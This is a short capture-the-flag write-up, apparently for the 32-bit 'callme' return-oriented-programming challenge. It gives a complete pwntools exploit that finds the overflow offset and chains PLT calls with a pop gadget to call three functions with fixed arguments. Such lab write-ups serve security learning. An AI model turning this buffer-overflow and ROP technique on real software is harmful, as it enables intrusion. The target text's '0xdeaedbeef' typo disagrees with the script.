# Callme

## Target
call `callme_one`, `callme_two` and `callme_three` in this order with the following arguments: `0xdeaedbeef`, `0xcafebabe` and `0xd00df00d`.

## The vuln
A buffer overflow allows ROPchain creation and execution. By using `ropper` or similar tools is possible to find gadgets which allows to correctly set the arguments and call the functions `callme_one`, `callme_two` and `callme_three` in sequence.

## The script
```python
from pwn import *

#
# Context
#

e = context.binary = ELF('callme32')

#
# Offset
#

io = process(e.path)

io.sendlineafter(b'> ', cyclic(0x200))
io.wait()

core = io.corefile

io.close()
offset = cyclic_find(core.eip.to_bytes(4, "big")[::-1])
info(f'Offset: {offset}')

#
# ROP
#

# Alternative: use "ropper"
CALLME_ONE   = p32(e.plt["callme_one"])
CALLME_TWO   = p32(e.plt["callme_two"])
CALLME_THREE = p32(e.plt["callme_three"])
EXIT         = p32(e.plt["exit"])

BIGPOP = p32(next(e.search(asm('pop esi; pop edi; pop ebp; ret;'))))

SET_PARAMETERS  = b''
SET_PARAMETERS += p32(0xdeadbeef)
SET_PARAMETERS += p32(0xcafebabe)
SET_PARAMETERS += p32(0xd00df00d)

#
# Exploit
#

io = process(e.path)

payload =  b''
payload += b'A' * offset

payload += CALLME_ONE
payload += BIGPOP
payload += SET_PARAMETERS

payload += CALLME_TWO
payload += BIGPOP
payload += SET_PARAMETERS

payload += CALLME_THREE
payload += BIGPOP
payload += SET_PARAMETERS

payload += EXIT
payload += p32(0)

io.sendlineafter(b'> ', payload)

info(io.recvuntil(b'}').decode())
io.close()
```